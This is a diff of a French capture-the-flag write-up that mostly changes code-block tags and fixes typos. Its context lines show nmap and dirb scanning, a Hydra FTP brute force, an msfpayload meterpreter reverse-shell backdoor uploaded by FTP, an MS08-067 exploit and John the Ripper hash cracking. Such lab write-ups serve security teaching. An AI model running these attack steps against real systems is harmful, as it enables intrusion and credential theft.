@@ -22,7 +22,7 @@ Le système est pré-configuré avec une adresse IP statique : 192.168.1.11.
 Découverte
 ----------
 
-```bash
+```console
 $ nmap -A -T4 192.168.1.11
 
 Starting Nmap 6.40 ( http://nmap.org ) at 2014-03-25 19:00 CET
@@ -58,7 +58,7 @@ Les ports 21 et 80 sont ouverts. Le reste des ports (en dehors du 443) sont filt
 
 Est-ce qu'il y a des dossiers cachés sur le serveur web ? Utilisons [dirb](http://dirb.sourceforge.net/) (un équivalent de *DirBuster* mais en console) pour s'en rendre compte :
 
-```bash
+```console
 $ ./dirb http://192.168.1.11/ wordlists/big.txt 
 
 -----------------
@@ -136,7 +136,7 @@ Puis on génère une seconde wordlist basée sur celle-ci en appliquant des muta
 
 On lance une attaque brute-force à l'aide de *THC-Hydra*. Après avoir testé différents logins (*bobby*, *admin*...) on trouve finalement le bon password pour l'utilisateur *bob* :
 
-```bash
+```console
 $ ./hydra -l bob -P ../candidates.txt -t 1 ftp://192.168.1.11/ 
 Hydra v7.6 (c)2013 by van Hauser/THC & David Maciejak - for legal purposes only
 
@@ -212,7 +212,7 @@ Dans le fichier *hint.html* on trouve le texte suivant :
 
 Soit ! On génère une backdoor *Metasploit* (un reverse-shell meterpreter) que l'on uploade sur le FTP (attention à être en mode binaire) :  
 
-```
+```bash
 msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.3 LPORT=9999 X > /tmp/rbd.exe
 ```
 
@@ -297,7 +297,7 @@ meterpreter > shell
 [-] stdapi_sys_process_execute: Operation failed: Access is denied.
 ```
 
-C'est du au faut que les droits dont on dispose sont ceux d'un *IUSR* (Internet User) qui doit être la correspondance *IIS* du *nobody* pour *Apache/Unix*.  
+C'est dû au fait que les droits dont on dispose sont ceux d'un *IUSR* (Internet User) qui doit être la correspondance *IIS* du *nobody* pour *Apache/Unix*.  
 
 Voyons voir ce qu'il y a d'autre comme services sur cette machine :  
 
@@ -357,7 +357,7 @@ msf exploit(ms08_067_netapi) > exploit
 [*] Auto-targeting failed, use 'show targets' to manually select one
 ```
 
-et si on fixe la target :  
+Et si on fixe la target :  
 
 ```
 [*] Started reverse handler on 127.0.0.1:9999 via the meterpreter on session 2
@@ -425,7 +425,7 @@ Là on est entré comme dans du beurre :)
 
 A partir de là on a le choix entre la méthode old-school de cassage de hash (a.k.a [classic one way ticket to Fuckneckville](https://www.youtube.com/watch?v=H7nBDONk4FA)) :  
 
-```bash
+```console
 $ /opt/jtr/john hash.txt                                                                                                                                                        
 Warning: detected hash type "lm", but the string is also recognized as "nt2"                                                                                                                                   
 Use the "--format=nt2" option to force loading these as that type instead                                                                                                                                      
